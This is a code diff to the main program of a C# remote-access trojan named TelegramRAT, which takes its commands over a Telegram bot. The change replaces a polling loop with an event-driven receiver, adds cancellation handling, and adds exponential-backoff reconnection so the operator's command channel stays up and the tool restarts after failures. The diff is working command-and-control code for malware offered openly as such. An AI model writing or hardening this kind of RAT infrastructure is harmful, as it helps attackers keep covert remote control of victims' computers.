@@ -1,9 +1,12 @@
 ﻿using BotCommand = TelegramRAT.Commands.BotCommand;
 using Telegram.Bot.Types.ReplyMarkups;
 using Telegram.Bot.Types.Enums;
+using Telegram.Bot.Polling;
+using Telegram.Bot.Exceptions;
 using TelegramRAT.Utilities;
 using TelegramRAT.Commands;
 using System.Diagnostics;
+using System.Threading;
 using Telegram.Bot.Types;
 using Telegram.Bot;
 using System.Net;
@@ -17,7 +20,9 @@ public static class Program
 
     public static readonly TelegramBotClient Bot = new TelegramBotClient(BotToken);
     public static readonly List<BotCommand> Commands = new();
-    private const int PollingDelay = 1000;
+
+    private static CancellationTokenSource? _receivingCts;
+    private static int _reconnectAttempt;
 
     public static async Task Main(string[] args)
     {
@@ -27,12 +32,21 @@ public static class Program
             return;
         }
 
+        var currentCts = new CancellationTokenSource();
+        _receivingCts = currentCts;
+
         try
         {
-            await RunAsync();
+            await RunAsync(currentCts.Token);
+        }
+        catch (OperationCanceledException) when (currentCts.IsCancellationRequested)
+        {
+            // Graceful shutdown requested.
         }
         catch (Exception ex)
         {
+            currentCts.Cancel();
+
             if (OwnerId != 0)
             {
                 await ReportExceptionAsync(new Message { Chat = new Chat { Id = (long)OwnerId } }, ex);
@@ -53,9 +67,19 @@ public static class Program
             Commands.Clear();
             await Main(args);
         }
+        finally
+        {
+            currentCts.Cancel();
+            currentCts.Dispose();
+
+            if (ReferenceEquals(_receivingCts, currentCts))
+            {
+                _receivingCts = null;
+            }
+        }
     }
 
-    private static async Task RunAsync()
+    private static async Task RunAsync(CancellationToken cancellationToken)
     {
         var markup = new InlineKeyboardMarkup(InlineKeyboardButton.WithCallbackData("Show All Commands"));
 
@@ -70,69 +94,93 @@ public static class Program
 
         CommandRegistry.InitializeCommands(Commands);
 
-        int offset = 0;
-
-        while (true)
+        var receiverOptions = new ReceiverOptions
         {
-            var updates = await Bot.GetUpdates(offset);
-            if (updates.Any())
-                offset = updates.Last().Id + 1;
+            AllowedUpdates = Array.Empty<UpdateType>()
+        };
 
-            await UpdateWorkerAsync(updates);
-            await Task.Delay(PollingDelay);
+        await Bot.ReceiveAsync(HandleUpdateAsync, HandlePollingErrorAsync, receiverOptions, cancellationToken);
+    }
+
+    private static Task HandleUpdateAsync(ITelegramBotClient bot, Update update, CancellationToken cancellationToken)
+    {
+        Interlocked.Exchange(ref _reconnectAttempt, 0);
+        return UpdateWorkerAsync(update, cancellationToken);
+    }
+
+    private static async Task HandlePollingErrorAsync(ITelegramBotClient bot, Exception exception, CancellationToken cancellationToken)
+    {
+        if (exception is ApiRequestException apiRequestException)
+        {
+            Console.WriteLine($"Telegram API Error:\n[{apiRequestException.ErrorCode}] {apiRequestException.Message}");
+        }
+        else
+        {
+            Console.WriteLine(exception);
+        }
+
+        var attempt = Interlocked.Increment(ref _reconnectAttempt);
+        var backoffSeconds = Math.Min(Math.Pow(2, attempt), 30);
+
+        try
+        {
+            await Task.Delay(TimeSpan.FromSeconds(backoffSeconds), cancellationToken);
+        }
+        catch (OperationCanceledException)
+        {
+            // Cancellation requested - exit without delaying further.
         }
     }
 
-    private static async Task UpdateWorkerAsync(IEnumerable<Update> updates)
+    private static async Task UpdateWorkerAsync(Update update, CancellationToken cancellationToken)
     {
-        foreach (var update in updates)
+        cancellationToken.ThrowIfCancellationRequested();
+
+        if (update.CallbackQuery is not null)
         {
-            if (update.CallbackQuery is not null)
+            var callback = update.CallbackQuery;
+            await Bot.AnswerCallbackQuery(callback.Id, "Callback received!");
+
+            if (callback.Message.ReplyMarkup != null)
             {
-                var callback = update.CallbackQuery;
-                await Bot.AnswerCallbackQuery(callback.Id, "Callback received!");
-
-                if (callback.Message.ReplyMarkup != null)
-                {
-                    await Bot.EditMessageReplyMarkup(
-                        callback.Message.Chat.Id,
-                        callback.Message.MessageId,
-                        replyMarkup: null
-                    );
-                }
-
-                if (callback.Data == "Show All Commands")
-                {
-                    var cmd = Commands.FirstOrDefault(c => c.Command == "commands");
-                    if (cmd != null)
-                        await cmd.Execute(new BotCommandModel { Message = callback.Message });
-                }
-                continue;
-            }
-
-            if (update.Message is null) continue;
-
-            var model = BotCommandModel.FromMessage(update.Message, "/");
-            if (model == null) continue;
-
-            var command = Commands.FirstOrDefault(c => c.Command.Equals(model.Command, StringComparison.OrdinalIgnoreCase)) ??
-                          Commands.FirstOrDefault(c => c.Aliases?.Contains(model.Command, StringComparer.OrdinalIgnoreCase) == true);
-
-            if (command == null) continue;
-
-            if (command.ValidateModel(model))
-            {
-                await command.Execute(model);
-            }
-            else
-            {
-                await Bot.SendMessage(
-                    update.Message.Chat.Id,
-                    $"This command requires arguments!\n\nTo get information about this command - type /help {model.Command}",
-                    replyParameters: new ReplyParameters { MessageId = model.Message.MessageId },
-                    parseMode: ParseMode.Html
+                await Bot.EditMessageReplyMarkup(
+                    callback.Message.Chat.Id,
+                    callback.Message.MessageId,
+                    replyMarkup: null
                 );
             }
+
+            if (callback.Data == "Show All Commands")
+            {
+                var cmd = Commands.FirstOrDefault(c => c.Command == "commands");
+                if (cmd != null)
+                    await cmd.Execute(new BotCommandModel { Message = callback.Message });
+            }
+            return;
+        }
+
+        if (update.Message is null) return;
+
+        var model = BotCommandModel.FromMessage(update.Message, "/");
+        if (model == null) return;
+
+        var command = Commands.FirstOrDefault(c => c.Command.Equals(model.Command, StringComparison.OrdinalIgnoreCase)) ??
+                      Commands.FirstOrDefault(c => c.Aliases?.Contains(model.Command, StringComparer.OrdinalIgnoreCase) == true);
+
+        if (command == null) return;
+
+        if (command.ValidateModel(model))
+        {
+            await command.Execute(model);
+        }
+        else
+        {
+            await Bot.SendMessage(
+                update.Message.Chat.Id,
+                $"This command requires arguments!\n\nTo get information about this command - type /help {model.Command}",
+                replyParameters: new ReplyParameters { MessageId = model.Message.MessageId },
+                parseMode: ParseMode.Html
+            );
         }
     }
 
